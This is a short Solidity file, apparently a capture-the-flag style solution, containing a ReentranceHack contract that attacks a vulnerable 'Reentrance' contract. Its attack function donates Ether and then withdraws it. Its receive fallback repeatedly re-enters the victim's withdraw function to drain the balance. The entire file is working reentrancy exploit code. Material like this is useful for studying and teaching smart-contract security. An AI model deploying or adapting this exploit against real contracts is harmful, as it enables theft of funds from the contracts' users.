// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceHack {
    function attack(address _victim) public payable {
        IReentrance(_victim).donate{value: msg.value}(address(this));
        IReentrance(_victim).withdraw(msg.value);
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            //  Re-enter caller to withdraw more
            if (msg.sender.balance >= msg.value) {
                IReentrance(msg.sender).withdraw(msg.value);
            } else {
                IReentrance(msg.sender).withdraw(msg.sender.balance);
            }
        }
    }
}
